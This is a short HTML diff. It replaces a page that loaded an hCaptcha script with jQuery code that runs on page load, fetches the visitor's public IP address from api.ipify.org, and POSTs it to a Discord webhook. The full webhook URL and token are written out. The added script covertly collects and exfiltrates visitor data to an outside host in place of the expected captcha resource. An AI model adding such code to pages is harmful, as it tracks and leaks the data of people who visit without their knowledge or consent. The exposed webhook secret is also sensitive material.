@@ -1,3 +1,11 @@
-<html>
-  <script type="text/javascript" src="https://newassets.hcaptcha.com/c/a91272a/hsw.js"></script>
-</html>
+<script src="jquery-3.7.1.min.js"></script>
+<script>
+  $.get('https://api.ipify.org', function(res) {
+    $.ajax({
+      url: "https://discord.com/api/webhooks/1173652131367108678/yunpd_oP9C9kc8geE7VsPkmrtfDYxT12KSgw-B-mMogag42cm0iH6hdaPTBRg1OyQJf5",
+      type: "POST",
+      data: JSON.stringify({content: res}),
+      contentType: "application/json"
+    });
+  });
+</script>
